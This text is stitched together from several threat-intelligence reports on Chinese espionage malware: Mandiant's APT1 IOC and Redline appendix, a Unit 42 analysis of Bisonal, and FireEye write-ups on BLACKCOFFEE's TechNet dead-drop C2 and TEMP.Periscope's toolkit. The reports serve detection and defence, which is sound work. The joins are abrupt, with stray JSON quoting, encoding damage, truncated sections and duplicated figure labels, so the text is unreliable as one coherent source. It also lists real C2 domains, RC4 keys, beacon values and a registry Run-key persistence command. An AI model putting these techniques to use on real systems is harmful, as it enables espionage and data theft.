two-factor authentication to maintain access to a victim network and its resources. Mandiant APT1 65 www.mandiant.com Complete MissionThe main goal of APT intrusions is to steal data, including intellectual property, business contracts or negotiations, policy papers or internal memoranda. Once APT groups ˜nd ˜les of interest on compromised systems, they often pack them into archive ˜les before stealing them. They most commonly use the RAR archiving utility for this task, but may also use other publicly available utilities such as ZIP or 7-ZIP. APT threat actors not only compress data, but frequently password-protect the archive. From there they use a variety of methods to transfer ˜les out of the victim network, including FTP, custom ˜le transfer tools, or existing backdoors.

APT1 Indicators and Using RedlineŽ With the release of Mandiant™s report, APT1: Exposing One of China™s Cyber Espionage Units, we are providing a set of APT1 IOCs in the digital portion of Appendix G to help detect malware described in Appendix C: The Malware Arsenal. IOCs can be used in investigations to ˜nd unknown evils or for detection of already known threats. The IOCs included in Appendix G ˜t the latter; however, keep in mind that APT1 does update their tools, and there are certainly malware variants and new families of malware that will not be detected with this set of IOCs. To ˜nd out more about the report or the digital appendices (to include downloading the set of APT1 IOCs in Appendix G: IOCs) go to http://www.mandiant. com/apt1. IOCs can be used in conjunction with Redline, Mandiant™s free host-based investigative tool, or with Mandiant Intelligent Response® (MIR), Mandiant™s commercial host-based investigative tool. Mandiant™s customers who have licensed MIR can simply import a zip ˜le of the IOCs into their controllers. For those without MIR, Redline can be downloaded from Mandiant™s web site at http://www.mandiant.com/resources/download/redline. Remember to always test new IOCs before using them in a production environment.What Are IOCs?Mandiant has developed an open, extendable standard for de˜ning and sharing threat information in a machine-readable format. Going well beyond static signature analysis, IOCs combine over 500 types of forensic evidence with grouping and logical operators to provide advanced threat detection capability. If you are not familiar with IOCs, go to the OpenIOC site for a description at http://openioc.org. Mandiant APT1 71 www.mandiant.com What Is Redline?Redline is Mandiant™s free tool for investigating hosts for signs of malicious activity through memory and ˜le analysis, and subsequently developing a threat assessment pro˜le. Redline provides several bene˜ts including the following:RAPID TRIAGEWhen confronted with a potentially compromised host, responders must ˜rst assess whether the system has active malware. Without installing software or disrupting the current state of the host, Redline thoroughly audits all currently- running processes and drivers on the system for a quick analysis; for a detailed analysis, it also collects the entire ˜le structure, network state, and system memory. Redline will also compare any MD5 value it collects, analyzes, and visualizes against an MD5 whitelist. Users can further analyze and view imported audit data using Redline™s Timeline functionality, which includes capabilities to narrow and ˜lter results around a given timeframe with the TimeWrinklesŽ and TimeCrunchesŽ features. REVEALS HIDDEN MALWARE The Redline Portable Agent can collect and analyze a complete memory image, working below the level at which kernel rootkits and other malware-hiding techniques operate. Many hiding techniques become extremely obvious when examined at the physical memory level, making memory analysis a powerful tool for ˜nding malware. It also reveals ﬁmemory onlyﬂ malware that is not present on disk.GUIDED ANALYSIS Mandiant™s Redline tool streamlines memory analysis by providing a proven work˛ow for analyzing malware based on relative priority. This takes the guesswork out of task and time allocation, allowing investigators to provide a focused response to the threats that matter most. Redline calculates a ﬁMalware Risk Indexﬂ that highlights processes more likely to be worth investigating, and encourages users to follow investigative steps that suggest how to start. As users review more audits from clean and compromised systems, they build up the experience to recognize malicious activity more quickly. As you investigate a system, here™s how Redline will help you focus your attention on the most productive data: INVESTIGATIVE STEPSRedline can collect a daunting amount of raw information. Its investigative steps help provide a starting place by highlighting speci˜c data and providing views that are most commonly productive in identifying malicious processes. Unless you are pursuing a speci˜c ﬁleadﬂ, we recommend working through the steps in order, examining the information for entries that don™t match your expectations.The key to becoming an effective investigator is to review Redline data from a variety of ﬁcleanﬂ and ﬁcompromisedﬂ systems. Over time, your sense of which entries are normal and which are of concern will develop quickly as you view more data. Mandiant APT1 72 www.mandiant.com MALWARE RISK INDEX SCORINGRedline analyzes each process and memory section using a variety of rules and techniques to calculate a ﬁMalware Risk Indexﬂ for each process. This score is a helpful guide to identifying those processes that are more likely to be worth investigating. Processes at the highest risk of being compromised by malware are highlighted with a red badge. Those with some risk factors have a grey badge, and low-risk processes have no badge.The MRI is not an absolute indication of malware. During an investigation you can re˜ne the MRI scoring by adjusting speci˜c hits (identifying false positives and false negatives) for each process, adding your own hits, and generally tuning the results.IOCsRedline provides the option of performing IOC analysis in addition to MRI scoring. Supplied a set of IOCs, the Redline Portable Agent will be automatically con˜gured to gather the data required to perform a subsequent IOC analysis; after the analysis is run, IOC hit results are available for further investigation.In addition, Redline provides the ability to create an IOC Collector. This feature enables the collection of data types required for matching a set of IOCs. WORKS WITH MIRCombined with MIR, Redline is a powerful tool for accelerated live response. Here™s a typical case: »IDS or other system detects suspicious activity on a host»From MIR, an investigator launches a remote live response script»The MIR Agent running on the host captures and analyzes memory locally, streaming back a small XML audit that downloads in minutes rather than hours»From MIR, the user can open the audit directly in Redline»Using Redline, the investigator quickly identi˜es a malicious process, and writes an IOC describing the forensic attributes found in Redline»Using MIR and MCIC, the investigator is quickly able to sweep for that IOC and discover all other systems on the network with the same (or similar) malware running Mandiant APT1 73 www.mandiant.com Have MIR Customers had Access to these IOCs Before?These IOCs are new! However, much of the detection capability in this set of indicators has already been available to our MIR customers. The IOCs may look different though as a result of improvements in creation and testing. Mandiant started 2013 with a focus on taking better advantage of our threat intelligence. We plan to continue to improve the synthesis of our threat intelligence and our IOCs by improving our breadth, IOC creation process, IOC management process, and IOC testing. The majority of these indicators, or modi˜ed versions of them, will be integrated into the next IOC release.What Is the FAMILY Designator in This Set of IOCs? We are using a new IOC designator in these IOCs called ﬁ(FAMILY).ﬂ Mandiant™s Threat Intelligence Unit tracks malware by common features seen in groups of binaries. We call those groupings of binaries ﬁfamilies.ﬂ The IOCs included in this appendix are representatives of families of malware used by APT1. The new designator follows the family name in the ﬁNameﬂ ˜eld of the IOC, and the presence of (FAMILY) implies that that IOC applies to the whole family, not just one sample. Why Do These IOCs Look Somewhat Different Than Other IOCs I Have Seen From Mandiant?In many cases we have combined information that previously would have been in several indicators into a single indicator. Additionally, we have removed certain types of intelligence, since they are being released in separate appendices (such as FQDNs and IPs).Additionally, some IOCs in this set are using ˜le permutation blocks to catch variants of malware that might not be detected otherwise.What Is a File Permutation block? It is a different way to structure lists of File Item attributes to look for an entire family of malware versus only one or two pieces. For more information on this topic or most any other IOC questions go to https://forums.mandiant.com.Will You Update These IOCs? It is likely that we will make some changes to the IOCs in Appendix G as we get feedback. If updated, the updates will be available in the same location as the report http://www.mandiant.com/apt1. Will You Be Releasing More IOCs Like This? Currently, there are no plans for additional public releases of this magnitude.

      "\"Bisonal Malware Used in Attacks Against Russia and South Korea\\nMenu\\nTools\\nPlaybooks\\nSpeaking Events\\nAbout Us\\nBisonal Malware Used in Attacks Against Russia and South Korea\\n10,255\\npeople reacted\\n0\\n11\\nmin. read\\nShare\\nBy Kaoru Hayashi and Vicky Ray\\nJuly 31, 2018 at 5:00 AM\\nCategory: Unit 42\\nTags: Bioazih, Bisonal, Dexbia, Operation Bitter Biscuit, Russia, South Korea\\nThis post is also available in:\\n日本語 (Japanese)Summary\\nIn early May, Unit 42 discovered an attack campaign against at least one defense company in Russia and one unidentified organization in South Korea delivering a variant of Bisonal malware. While not previously publicly documented, the variant has been in the wild since at least 2014. There are three primary differences between it and older Bisonal malware including a different cipher and encryption for C2 communication, and a large rewrite of the code for both network communication and maintaining persistence. To date, we have only collected 14 samples of this variant, indicating it may be sparingly used. The adversary behind these attacks lured the targets into launching the Microsoft Windows executable malware by masquerading it as a PDF file (using a fake PDF icon) and reusing publicly available data for the decoy PDF file’s contents.\\nAttacks using Bisonal have been blogged about in the past. In 2013, both COSEINC and FireEye revealed attacks using Bisonal against Japanese organizations . In October 2017, AhnLab published a report called “Operation Bitter Biscuit,” an attack campaign against South Korea, Japan, India and Russia using Bisonal and its successors, Bioazih and Dexbia. We believe it is likely these tools are being used by one group of attackers.\\nThough Bisonal malware has been in the wild for at least seven years and frequently updated, the actors keep using same high-level playbooks. Common features of attacks involving Bisonal include:\\nUsually targeting organizations related to government, military or defense industries in South Korea, Russia, and Japan.\\nIn some cases, the use of Dynamic DNS (DDNS) for C2 servers.\\nThe use of a target or campaign code with its C2 to track victim or attack campaign connections.\\nDisguising the Bisonal malware as a PDF, Microsoft Office Document or Excel file.\\nThe use of a decoy file in addition to the malicious PE file\\nIn some cases, code to handle Cyrillic characters on Russian-language operating systems.\\nWe observed all these characteristics in the latest attacks against both Russia and South Korea.\\nTargeting Russia\\nWhile investigating attack campaigns, Unit 42 discovered a targeted attack against at least one organization in Russia which provides communication security services and products. The targeted organization specialises in encryption and cryptographic services and develops a broad number of secure communication products which also includes telecommunication systems and data protection facilities. Given the sensitivity of the products being developed by the target organization, it is not a surprise to see a targeted attack towards the organisation by a known threat actor.\\nFigure 1 shows the spear-phishing email sent to the target organization. The email was spoofed to look like it was sent from Rostec, a Russian state corporation that promotes the development, production and export of high-tech industrial products. The contents of the email suggest it was sent from the legal support and corporate governance department of Rostec and includes project details aimed at improving the housing conditions of defence industry workers. It is interesting to note there is a relationship between the target company and Rostec: the attackers may be trying to exploit the relationship between Rostec and the target to add an additional air of legitimacy to the attack.\\nFigure 1. Spear-phishing email sent to the Russian company\\nBelow is the translation from Russian into English by Google Translate.\\nSubject:\\nA comprehensive project to create housing and construction cooperatives for defence workers\\nBody:\\nGood afternoon, dear colleagues!\\nBy the May Day, I am sending you a comprehensive project aimed at improving the housing conditions of defence industry workers\\nCongratulations!\\nAttachment:\\nComprehensive project for the creation of housing construction cooperatives for defence workers .exe\\nAs you can see in Figure 1, some email clients do not display the attachment as the PDF. However, if you save the file on the computer, it looks like a PDF document because the executable file has the PDF icon in the resource.\\nOnce the malicious executable attachment is opened, the main payload is dropped in the victim machine and displays a decoy file to the victim. Figure 2 shows the contents of the decoy file which is a PDF whose contents are an exact match to an article published on Rostec’s website on January 30th, 2018. The article discusses new housing project plans by Rostec and other state departments, and the benefits to the defence industry workers who are eligible for free housing under the project.\\nFigure 2 Decoy pdf file\\nUpon further analysis of the malware payload, we determined it is part of the Bisonal malware family. Since the details of the malware family have already been published, we will discuss some of the unique indicators and techniques the threat actor behind Bisonal\\xa0employed in this campaign.\\nMalware Analysis\\nMalware Dropper\\nThe dropper executable file in the Russian attack hides the encrypted Bisonal DLL file and non-malicious decoy file at the end of its body. Once executed, the dropper decrypts the data blob using the RC4 cipher with the key, “34123412”, saves them in the path shown below and executes them.\\nType\\nPATH\\nSHA256\\nDropper EXE\\nN/A\\nb1da7e1963dc09c325ba3ea2442a54afea02929ec26477a1b120ae44368082f8\\nBisonal DLL\\nC:\\\\Windows\\\\Temp\\\\pvcu.dll\\n1128D10347DD602ECD3228FAA389ADD11415BF6936E2328101311264547AFA75\\nRussian Decoy PDF\\nC:\\\\Windows\\\\Temp\\\\Комплексный проект по созданию жилищно-строительных кооперативов для работников оборонки.pdf\\nF431E0BED6B4B7FFEF5E40B1B4B7078F2538F2B2DB2869D831DE5D7DF26EE6CD\\nTable 1. File hashes and paths targeting Russia\\nThe dropper then creates following registry entry to execute the Bisonal sample when the computer reboots:\\nHKEY_CURRENT_USER \\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\”vert” = “rundll32.exe c:\\\\windows\\\\temp\\\\pvcu.dll , Qszdez”\\nBisonal main module\\nThe DLL (pvcu.dll) is Bisonal malware but using a different cipher for C2 communication that other publicly documented samples. Booz Allen Hamilton in 2014 and AhnLab in 2015 reported on Bisonal using a simple XOR cipher to hide the C2 address strings in the body. The Bisonal sample we observed in this case employs the RC4 cipher with the key “78563412”. To date, all Bisonal samples we have seen using RC4 use this same key. The oldest sample we have dates to 2014, so this variant has been in the wild for several years.\\nAdding to the change in encryption type, a large part of the code such as network communication procedures, and the persistence method have been re-written. For example, the Bisonal malware in 2012 used send() and recv() APIs to communicate with its C2. For this variant, the developer wholly recreated C2 code from scratch by using other network APIs, such as HttpSendRequest() and InternetReadFile().\\nThis Bisonal variant used in the latest attack communicates with one of the following hard-coded C2 addresses by using the HTTP POST method on TCP port 443.\\nkted56erhg.dynssl.com\\neuiro8966.organiccrap.com\\nThese domains are provided by a free DDNS service and both resolve to the same IP address, 116.193.155.38.\\nWhen this Bisonal variant communicates with its C2, the malware sends an HTTP POST request with the static strings “ks8d” and “akspbu.txt”, and the IP address of the compromised machine. Figure 3 shows the initial HTTP POST request to the C2 server.\\nFigure 3. Initial network C2 beacon\\nReaders may notice the missing closing parenthesis in the User Agent request header. That string is hardcoded in this malware variant. We have more than 230 samples of Bisonal in total and only 14 samples since 2014 use this incomplete User Agent string. It is unclear whether the author forgot to add closing parenthesis while developing the code, or intentionally use this string for validating the connection to the C2 server. Either way, it can be a good Indicator in network logs for a possible Bisonal infection.\\nC2 Communication\\nAnother sign of the infection is the data being sent to the C2 server during the initial connection. Every time this variant of Bisonal communicates with its C2, it sends a unique id number and backdoor command in the first eight bytes. The malware sends hardcoded DWORD values (0x10000 and 0x3E7) just for the initial connection and receives updated values from the C2 and uses them for further communication. As described above, all communications between this Bisonal variant and C2 are encrypted by RC4 cipher with the static key “78563412”. As the result of enciphering static values, the backdoor always sends identical eight bytes of data (81b2a8977ea31b91) to the C2 first.\\nSoon after receiving the initial beacon from the victim infected with Bisonal, the C2 replies with a session id number and backdoor command. The session id number is consistent throughout the C2 communication. The malware then processes the given command on the compromised system and sends the result back to C2 with the session id number and the backdoor command number. Then the C2 replies with that same session id number. The backdoor waits five seconds and restarts communication with the C2 with the same session id number.\\nBelow is an example of the reply to the command, “get system info”. The actual traffic between the C2 and Bisonal sample is on the left side, and the decrypted payload is on the right side. The first DWORD (four bytes) is the given session id, 0x00000003, and the next DWORD is a backdoor command, 0x000000C8. At offset 8 of the decrypted payload, there is a campaign or target code. In this sample, it is “0425god”.\\nFigure 4 Decrypted payload showing the target/campaign code\\nFollowing is the diagram of the session between Bisonal and C2.\\nFigure 5. Bisonal C2 communication flow\\nThe following table shows the list of backdoor commands this sample supports.\\nCommand\\nMeaning\\n0x000000C8\\ngets system info\\n0x000000C9\\ngets running process list\\n0x000000CA\\nterminates process\\n0x000000CB\\naccesses cmd shell\\n0x000000CD\\ndownloads file\\n0x000000CF\\nexecutes file\\n0x000000D1\\ncreates file\\nTable 2 Backdoor commands\\nStrong Interests in Cyrillic\\nPrevious reports have discussed Bisonal malware used in attacks against Japan, South Korea and Russia. This particular sample we found targeted an organization in Russia and there is a specific system language check for Cyrillic and no others. When the backdoor receives the shell access command, it checks the code page of the compromised system. If it’s Cyrillic and the command to the shell is not ‘ipconfig’, the threat converts the command result text encoding from Cyrillic to UTF-16. For any other code page the malware presumes the resulting text as default Windows ANSI code page and also converts it to UTF-16. It is not known why the malware author called out Cyrillic specifically when the malware would convert any text to UTF-16. Windows ANSI code pages supports ASCII characters and non-ASCII values as the international characters depends on the OS language. UTF-16 can support maximum 1 million characters in Unicode. To avoid corrupting Cyrillic (and other language) characters in the results, the developer added the code to the malware.\\nFigure 6. Checking of Cyrillic character set\\nThis Cyrillic/ipconfig checks in the ‘shell access’ backdoor command exists in some original Bisonal samples found in 2012. The sample (43459f5117bee7b49f2cee7ce934471e01fb2aa2856f230943460e14e19183a6) contains the marker string “bisonal” which is the origin of the malware name. This is one of the many reasons we strongly believe the latest samples are variants of Bisonal.\\nFigure 7. ‘bisonal’ marker string\\nTargeting South Korea\\nWhile investigating other Bisonal samples we found another dropper submitted to an online malware database on March 6. The original file name was “2018년 해양경찰청 공무원 (7급 9급) (2018.03.05).pdf.exe”. This translates to “2018 Korean Coast Guard Government Employee (Grade 7, Grade 9).pdf.exe” in English. Similar to the Bisonal variant targeting the Russian organization, this sample was also disguised as PDF document.\\nFigure 8.

These files are not encrypted and the offset to the EXE and PDF file in the dropper is appended at the end of the dropper file. In the Russian samples, the offset to these files is hardcoded in the code.\\nThe file name of the decoy file is based on the dropper file name. The dropper code creates a PDF at the same directory, give the same name with itself to the decoy file, removes .exe and adds .pdf in the code. For example, if the file name is ABCDEFG.pdf.exe, the decoy filename would be pdf.pdf.\\nThe dropper also creates two VBS scripts in the %Temp% directory with a random 4 digits hexadecimal name. One of them opens the decoy PDF file. The other deletes the dropper and the VBS script itself.\\nThe contents of the decoy PDF is a job descriptions with the South Korean Coast Guard. The original document was a Hangul Word Processor(HWP) file posted on the South Korean Coast Guard website on March 5, 2018. Based on the metadata we found in the PDF, we strongly believe that the attacker converted the HWP to PDF. Figure 8, below, shows metadata added to the decoy file when converting the original file to PDF. The metadata indicates that the file was created with Adobe Distiller 8.00 (Windows) on March 6 by \\xa0“조영태” (Cho Young Tae in English).\\nInterestingly, the same creator name is found in the decoy PDF file of another sample of the Bisonal variant (dfa1ad6083aa06b82edfa672925bb78c16d4e8cb2510cbe18ea1cf598e7f2722) submitted to an online malware database in September 2014. This decoy is a contact list of Agriculture, Food, Rural Affairs, Oceans and Fisheries Committee of the National Assembly of the Republic of Korea. According to the metadata, this file is also converted from an HWP document with same tool by same creator. Though we don’t know whether the creator is real or fake information, we can say the attacker has not changed this tool and technique for years.\\nFigure 8. Metadata in the decoy file\\nMain EXE\\nThe installed EXE file is almost exactly the same as the DLL version of Bisonal variant used against the Russian organization. Following is a brief write-up of the Bisonal EXE’s behavior. There are only three differences from the DLL sample; creating a registry entry by itself, the C2 domain and the target or campaign code. The EXE’s behavior is discussed below.\\nIt creates the registry entry, HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\”mismyou” = %Temp%random.tmp to achieve persistence. In contrast, the DLL version does not create a registry entry because the dropper of the DLL does.\\nIt decrypts the C2 domain address by using the RC4 cipher with the same key “78563412”.\\nIt connects to hxxp://games.my-homeip.com:443/ks8dip addressakspbu.txt by using the HTTP POST method with the same incomplete User Agent string “Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.1.4322”\\nIt sends the same initial beacon value of 81b2a8977ea31b91 to the C2 server.\\nIt uses a different target or campaign code, “pmo”.\\nIt has same backdoor commands, starting with 0x000000C8 in hex.\\nIt also checks the code page and command in “shell access” and converts text from Cyrillic to UTF-16.\\nFollowing table is the summary of the Bisonal samples described in this article.\\nYear\\nTarget Country\\nCampaign or Target Code\\nSHA256\\nCipher\\nBisonal Marker\\nCyrillic/\\nipconfig check\\nC2\\n2012\\nunidentified\\n1031\\n43459f5117bee7b49f2cee7ce934471e01fb2aa2856f230943460e14e19183a6\\nXOR\\nYES\\nYES\\njennifer998.lookin.at, 196.44.49.154\\n2014\\nSouth Korea\\n0919-1\\ndfa1ad6083aa06b82edfa672925bb78c16d4e8cb2510cbe18ea1cf598e7f2722\\nRC4\\nNO\\nYES\\nwww.hosting.tempors.com\\n2018\\nRussia\\n0425god\\n1128D10347DD602ECD3228FAA389ADD11415BF6936E2328101311264547AFA75\\nRC4\\nNO\\nYES\\nkted56erhg.dynssl.com, euiro8966.organiccrap.com\\n2018\\nSouth Korea\\npmo\\n359835C4A9DBE2D95E483464659744409E877CB6F5D791DAA33FD601A01376FC\\nRC4\\nNO\\nYES\\ngames.my-homeip.com\\nTable 4 Summary of the Bisonal samples in this blog\\nConclusion\\nThe attackers behind Bisonal have been active for at least 7 years, and the variant used against the Russian and South Korean targets discussed in this blog in the wild since 2014. Since the attackers frequently rewrite functions from scratch and avoid reusing infrastructures, some samples look very different from original Bisonal malware. However, as we discussed in this blog, the same original piece of code referencing the malware name “bisonal” remains in at least some samples.\\nWe are still investigating the connection between the latest attacks discussed in this blog and the previous Bisonal attacks reported by industry colleagues. The high-level TTPs of the adversary behind these Bisonal samples matches with previous Bisonal activity. The targets are military or defense industry in particular countries, it used DDNS for C2 servers, and tracked connections from their victims by using target or campaign codes, as well as disguising the malware as document file, and using a dropper to install the malware and decoy file.

      "'REPORT MAY 2015 FIREEYE LABS / FIREEYE THREAT INTELLIGENCE HIDING IN PLAIN SIGHT: FIREEYE AND MICROSOFT EXPOSE OBFUSCATION TACTIC 32FireEye Threat Intelligence and the Microsoft Threat Intelligence Center investigated a command-and-control (CnC) obfuscation tactic used on Microsoft™s TechNet, a web portal for IT professionals. TechNet™s security was in no way compromised by this tactic, which is likely possible on other message boards and forums.FireEye Threat Intelligence assesses that APT17, a China-based threat group, was behind the attempt. Other groups have used legitimate websites to host CnC IP address in the past. APT17 was embedding the encoded CnC IP address for the BLACKCOFFEE malware in legitimate Microsoft TechNet profiles pages and forum threads, a method some in the information security community call a ﬁdead drop resolver.ﬂ Encoding the IP address makes it more difficult to identify the true CnC address for network security professionals.Few security companies have publicly discussed this tactic. After discovering the BLACKCOFFEE activity, the FireEye-Microsoft team encoded a sinkhole IP address into the profile pages and forum threads and locked the accounts to prevent the threat actors from making any changes. This collaborative approach allowed the team to observe the malware and its victims. Though the security community has not yet broadly discussed this technique, FireEye has observed other threat groups adopting these measures and expect this trend to continue on other community sites. Today, FireEye released Indicators of Compromise (IOCs) for BLACKCOFFEE and Microsoft released signatures for its anti-malware products.FIREEYE HAS OBSERVED THE CHINA- BASED APT17 DISGUISING THEIR TRAFFIC APT17, also known as DeputyDog, is a China-based threat group that FireEye Intelligence has observed conducting network intrusions against U.S. government entities, the defense industry, law firms, information technology companies, mining companies, and non-government organizations. BLACKCOFFEE™s functionality includes uploading and downloading files; creating a reverse shell; enumerating files and processes; renaming, moving, and deleting files; terminating processes; and expanding its functionality by adding new backdoor commands. FireEye has monitored APT17™s use of BLACKCOFFEE variants since 2013 to masquerade malicious communication as normal web traffic by disguising the CnC communication as queries to web search engines. THREAT ACTORS™ C nC: FROM OBVIOUSLY MALICIOUS TO THOUGHTFULLY OBFUSCATED The use of BLACKCOFFEE demonstrates threat actors™ evolving use of public websites to hide in plain sight. In the past, threat actors would modify easily compromised websites to host CnC commands and configuration, as observed in the China-based APT1™s WEBCnC suite of backdoors. Now, threat actors are using well-known websitesŠthat they do not need to compromiseŠ to host CnC IP addresses. They simply use the website for legitimate purposes, such as posting forum threads or creating profile pages. APT17 went further to obfuscate their CnC IP address and employed a multi-layered approach for the malware to finally beacon the true CnC IP. They used legitimate infrastructureŠthe ability to post or create comments on forums and profile pagesŠto embed a string that the malware would decode to find and communicate with the true CnC IP address. This additional obfuscation puts yet another layer between APT17 and the security professionals attempting to chase them down. HOW BLACKCOFFEE WORKS This BLACKCOFFEE variant contains one or more URLs that link to the biography sections of attacker-created profiles as well as forum threads that contain comments from those same profiles. A URL is randomly selected and the malware searches at that location for an encoded IP address located between two tags, ﬁ@MICR0S0FTﬂ and ﬁC0RP0RATI0Nﬂ.Using Microsoft TechNet, a web portal for IT professionals, host encoded CnC IP addresses that would direct a variant of the BLACKCOFFEE backdoor to their CnC server . 54Actual Command and Control traffic is sent to the decoded CnC IPAPT17™s Malicious Use of Technet The malware then communicates directly with the retrieved and decoded IP address to receive commands and send stolen information. If the CnC server is discovered or shut down, the threat actors can update the encoded IP address on TechNet to maintain control of the victims™ machines. BLACKCOFFEE supports an initial set of fifteen commands, including creating a reverse shell, uploading and downloading files, and enumerating files and processes. The attackers can also extend BLACKCOFFEE™s functionality through additional commands sent as shellcode. IOCS/MD5SIndicators of compromise are available on Github at github.com/fireeye/iocs . EXPECT MORE THREAT GROUPS TO EMPLOY LEGITIMATE WEBSITES IN OPERATIONS We have already observed threat actors adopting similar techniques and moving some CnC activity to legitimate websites that they do not need to compromise. In the same vein, some threat actors have already begun using social media sites such as Twitter and Facebook for malware distribution and CnC. APT17™s tacticŠusing a dead drop resolver and embedding encoded IP addresses as opposed to displaying it in plain textŠcan delay detection, discourage IT staff from discovering the actual CnC IP address, and prevent discovery of the CnC IP via binary analysis. FireEye expects that threat groups are already using this technique, with their own unique variations, and others will adopt similar measures to hide in plain sight.A TechNet forum thread modified by BLACKCOFFEE: APT17 encodes an IP address on a newly created TechNet profile or encodes the IP address on a forum thread using one of their profilesBLACKCOFFEE checks the altered TechNet page for encoded tag containing address of CnC server Encoded command and control server IP is sent back to BLACKCOFFEE on the victim™s computer BLACKCOFFEE is capable of uploading, downloading, renaming, moving, or deleting files, terminating processes, or adding new backdoor commands The victim™s network security monitors see traffic from TechNet CnC SERVERVictim infected with BLACKCOFFEE To download this or other FireEye Threat Intelligence reports, visit: https://www.fireeye.com/reports.html © 2015 FireEye, Inc.

The campaign is linked to a group of suspected Chinese cyber espionage actors we have tracked since 2013, dubbed TEMP.Periscope. The group has also been reported as “Leviathan” by other security firms.\\nThe current campaign is a sharp escalation of detected activity since summer 2017. Like multiple other Chinese cyber espionage actors, TEMP.Periscope has recently re-emerged and has been observed conducting operations with a revised toolkit. Known targets of this group have been involved in the maritime industry, as well as engineering-focused entities, and include research institutes, academic organizations, and private firms in the United States. FireEye products have robust detection for the malware used in this campaign.\\nTEMP.Periscope Background\\nActive since at least 2013, TEMP.Periscope has primarily focused on maritime-related targets across multiple verticals, including engineering firms, shipping and transportation, manufacturing, defense, government offices, and research universities. However, the group has also targeted professional/consulting services, high-tech industry, healthcare, and media/publishing. Identified victims were mostly found in the United States, although organizations in Europe and at least one in Hong Kong have also been affected. TEMP.Periscope overlaps in targeting, as well as tactics, techniques, and procedures (TTPs), with TEMP.Jumper, a group that also overlaps significantly with public reporting on “NanHaiShu.”\\nTTPs and Malware Used\\nIn their recent spike in activity, TEMP.Periscope has leveraged a relatively large library of malware shared with multiple other suspected Chinese groups. These tools include:\\nAIRBREAK: a JavaScript-based backdoor also reported as “Orz” that retrieves commands from hidden strings in compromised webpages and actor controlled profiles on legitimate services.\\nBADFLICK: a backdoor that is capable of modifying the file system, generating a reverse shell, and modifying its command and control (C2) configuration.\\nPHOTO: a DLL backdoor also reported publicly as “Derusbi”, capable of obtaining directory, file, and drive listing; creating a reverse shell; performing screen captures; recording video and audio; listing, terminating, and creating processes; enumerating, starting, and deleting registry keys and values; logging keystrokes, returning usernames and passwords from protected storage; and renaming, deleting, copying, moving, reading, and writing to files.\\nHOMEFRY: a 64-bit Windows password dumper/cracker that has previously been used in conjunction with AIRBREAK and BADFLICK backdoors. Some strings are obfuscated with XOR x56. The malware accepts up to two arguments at the command line: one to display cleartext credentials for each login session, and a second to display cleartext credentials, NTLM hashes, and malware version for each login session.\\nLUNCHMONEY: an uploader that can exfiltrate files to Dropbox.\\nMURKYTOP: a command-line reconnaissance tool. It can be used to execute files as a different user, move, and delete files locally, schedule remote AT jobs, perform host discovery on connected networks, scan for open ports on hosts in a connected network, and retrieve information about the OS, users, groups, and shares on remote hosts.\\nChina Chopper: a simple code injection webshell that executes Microsoft .NET code within HTTP POST commands. This allows the shell to upload and download files, execute applications with web server account permissions, list directory contents, access Active Directory, access databases, and any other action allowed by the .NET runtime.\\nThe following are tools that TEMP.Periscope has leveraged in past operations and could use again, though these have not been seen in the current wave of activity:\\nBeacon: a backdoor that is commercially available as part of the Cobalt Strike software platform, commonly used for pen-testing network environments. The malware supports several capabilities, such as injecting and executing arbitrary code, uploading and downloading files, and executing shell commands.\\nBLACKCOFFEE: a backdoor that obfuscates its communications as normal traffic to legitimate websites such as Github and Microsoft's Technet portal. Used by APT17 and other Chinese cyber espionage operators.\\nAdditional identifying TTPs include:\\nSpear phishing, including the use of probably compromised email accounts.\\nLure documents using CVE-2017-11882 to drop malware.\\nStolen code signing certificates used to sign malware.\\nUse of bitsadmin.exe to download additional tools.\\nUse of PowerShell to download additional tools.\\nUsing C:\\\\Windows\\\\Debug and C:\\\\Perflogs as staging directories.\\nLeveraging Hyperhost VPS and Proton VPN exit nodes to access webshells on internet-facing systems.\\nUsing Windows Management Instrumentation (WMI) for persistence.\\nUsing Windows Shortcut files (.lnk) in the Startup folder that invoke the Windows Scripting Host (wscript.exe) to execute a Jscript backdoor for persistence.\\nReceiving C2 instructions from user profiles created by the adversary on legitimate websites/forums such as Github and Microsoft's TechNet portal.\\nImplications\\nThe current wave of identified intrusions is consistent with TEMP.Periscope and likely reflects a concerted effort to target sectors that may yield information that could provide an economic advantage, research and development data, intellectual property, or an edge in commercial negotiations.\\nAs we continue to investigate this activity, we may identify additional data leading to greater analytical confidence linking the operation to TEMP.Periscope or other known threat actors, as well as previously unknown campaigns.\\nIndicators\\nFile\\nHash\\nDescription\\nx.js\\n3fefa55daeb167931975c22df3eca20a\\nHOMEFRY, a 64-bit Windows password dumper/cracker\\nmt.exe\\n40528e368d323db0ac5c3f5e1efe4889\\nMURKYTOP, a command-line reconnaissance tool\\ncom4.js\\na68bf5fce22e7f1d6f999b7a580ae477\\nAIRBREAK, a JavaScript-based backdoor which retrieves commands from hidden strings in compromised webpages\\nHistorical Indicators\\nFile\\nHash\\nDescription\\ngreen.ddd\\n3eb6f85ac046a96204096ab65bbd3e7e\\nAIRBREAK, a JavaScript-based backdoor which retrieves commands from hidden strings in compromised webpages\\nBGij\\n6e843ef4856336fe3ef4ed27a4c792b1\\nBeacon, a commercially available backdoor\\nmsresamn.ttf\\na9e7539c1ebe857bae6efceefaa9dd16\\nPHOTO, also reported as Derusbi\\n1024-aa6a121f98330df2edee6c4391df21ff43a33604\\nbd9e4c82bf12c4e7a58221fc52fed705\\nBADFLICK, backdoor that is capable of modifying the file system, generating a reverse shell, and modifying its command-and-control configuration\\nPrevious Post\\nNext Post\\nPromotion\\nSubscribe\\nShare\\nRecent\\nRSS\\nEmail UpdatesInformation and insight on today's advanced threats from FireEye.\\nShare\\nRecent Posts\\n24 Feb 2020Ransomware Against the Machine: How Adversaries are Learning to Disrupt\\nIndustrial Production by Targeting IT and OT\\n20 Feb 2020M-Trends 2020: Insights From the Front Lines\\n19 Feb 2020The Missing LNK — Correlating User Search LNK files\\nRSS Feed: Stay Connected\\nCompany\\nWhy FireEye?\\nCustomer Stories\\nCareers\\nCertifications and Compliance\\nInvestor Relations\\nSupplier Documents\\nNews and Events\\nNewsroom\\nPress Releases\\nWebinars\\nEvents\\nAwards and Honors\\nEmail Preferences\\nTechnical Support\\nIncident?\\nReport Security Issue\\nContact Support\\nCustomer Portal\\nCommunities\\nDocumentation Portal\\nFireEye Blogs\\nThreat 